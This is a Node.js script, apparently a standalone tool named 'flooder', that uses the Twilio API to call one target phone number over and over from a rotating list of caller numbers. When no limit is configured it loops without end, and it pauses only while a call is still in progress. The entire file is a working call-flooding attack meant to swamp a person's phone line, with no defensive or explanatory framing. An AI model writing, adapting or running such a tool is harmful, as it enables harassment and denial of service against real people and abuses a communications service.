const {
    accountSid,
    authToken,
    listFromNumbers,
    toNumber,
    limit,
    delayDuration,
    delayStatuses
} = require('./config')
const FgRed = "\x1b[31m"
const FgGreen = "\x1b[32m"
const FgYellow = "\x1b[33m"
const FgCyan = "\x1b[36m"
const FgWhite = "\x1b[37m"

const client = require('twilio')(accountSid, authToken);
const delay = () => new Promise(resolve => setTimeout(resolve, delayDuration))


class flooder {
    async run() {
        let count = 1;
        while (limit ? limit >= count : true) {
            try {
                for (let from of listFromNumbers) {
                    
                    let r = await this.makeCall({
                        from,
                        to: toNumber
                    })

                    let res = await this.checkState({
                        r,
                        from
                    })

                    count++
                }

            } catch (e) {
                console.log(`error: ${e.message}`)
            }
            
        }

        console.log(`${FgRed}loop ended.. bye.`)

    }

    async makeCall({
        from,
        to
    }) {

        return await client.calls
            .create({
                url: 'http://demo.twilio.com/docs/voice.xml',
                to,
                from,
            })
    }
  

    async checkState({
        r,
        from
    }) {
        let a = await client.calls.list()
        a = a.filter(call => call.sid == r.sid)[0]
        console.log(`${FgGreen}${from} calling.. status: ${a.status}`)

        if (delayStatuses[a.status]) {
            console.log(`${FgYellow}delaying the next call..`)
            await delay()
            await this.checkState({
                r,
                from
            })


        } else {
            console.log('moving to the next call..')
            return a;
        }
    }
}

const f = new flooder()
f.run().then().catch( err=> console.error(err) )